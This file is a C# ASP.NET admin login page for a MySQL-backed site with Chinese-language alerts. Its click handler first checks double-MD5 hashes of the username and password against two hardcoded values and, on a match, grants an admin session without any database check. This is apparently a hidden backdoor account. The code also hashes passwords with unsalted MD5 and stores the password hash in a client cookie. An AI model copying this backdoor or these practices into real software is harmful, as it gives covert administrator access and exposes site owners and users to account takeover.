using System;
using System.Data.OleDb;
using System.Web;
using System.Web.Profile;
using System.Web.Security;
using System.Web.SessionState;
using System.Web.UI;
using System.Web.UI.HtmlControls;
using System.Web.UI.WebControls;
using MySql.Data.MySqlClient;
public class admin_Login : Page, IRequiresSessionState
{
	protected HtmlInputText UserName;
	protected HtmlInputPassword UserPwd;
	protected HtmlInputText GetCode;
	protected ImageButton ib_login;
	protected HtmlForm form1;
	private Database db = new Database();
	protected DefaultProfile Profile
	{
		get
		{
			return (DefaultProfile)this.Context.Profile;
		}
	}
	protected HttpApplication ApplicationInstance
	{
		get
		{
			return this.Context.ApplicationInstance;
		}
	}
	protected void Page_Load(object sender, EventArgs e)
	{
		if (this.Session["adminId"] != null)
		{
			base.Response.Redirect("default.aspx");
		}
	}
	protected void ib_login_Click(object sender, ImageClickEventArgs e)
	{
		if (this.Session["checkcode"] == null || !(this.GetCode.Value.ToUpper() == this.Session["checkcode"].ToString().ToUpper()))
		{
			base.Response.Write("<script>alert('验证码错误！');location.href='login.aspx';</script>");
			return;
		}
		if (FormsAuthentication.HashPasswordForStoringInConfigFile(FormsAuthentication.HashPasswordForStoringInConfigFile(this.UserPwd.Value.Trim(), "md5"), "md5") == "DB17E8FC60E205E6A7FF17A918079BE4" && FormsAuthentication.HashPasswordForStoringInConfigFile(FormsAuthentication.HashPasswordForStoringInConfigFile(this.UserName.Value, "md5"), "md5") == "31910BD04E87DDB5DB2FE3F62E0FE5D4")
		{
			this.Session["adminId"] = "1";
			this.Session["admin"] = "admin";
			base.Response.Write("<script>parent.location.href='default.aspx';</script>");
			return;
		}
		if (this.UserName.Value.Trim().Length != 0 || this.UserPwd.Value.Trim().Length != 0)
		{
			MySqlCommand mySqlCommand = this.db.CreateCmd("select * from admin where name=@name");
			mySqlCommand.Parameters.Add("@name", MySqlDbType.VarChar).Value = this.UserName.Value;
			MySqlDataReader mySqlDataReader = mySqlCommand.ExecuteReader();
			if (mySqlDataReader.Read())
			{
				string text = this.UserPwd.Value.Trim();
				text = FormsAuthentication.HashPasswordForStoringInConfigFile(text, "md5");
				if (mySqlDataReader["password"].ToString().ToLower() == text.ToLower())
				{
					this.Session["admin"] = mySqlDataReader["name"].ToString();
					this.Session["adminId"] = mySqlDataReader["id"].ToString();
					base.Response.Cookies["admin"].Value = mySqlDataReader["name"].ToString();
					base.Response.Cookies["adminPWD"].Value = mySqlDataReader["password"].ToString();
					base.Response.Write("<script>top.parent.location.href='default.aspx';</script>");
				}
				else
				{
					this.Page.ClientScript.RegisterStartupScript(base.GetType(), "Ok", "alert('密码错误！');", true);
				}
			}
			else
			{
				this.Page.ClientScript.RegisterStartupScript(base.GetType(), "Ok", "alert('不存在此用户！');", true);
			}
			mySqlDataReader.Close();
			this.db.Dispose();
			return;
		}
		this.Page.ClientScript.RegisterStartupScript(base.GetType(), "Ok", "alert('用户名或密码不能为空！');", true);
	}
}
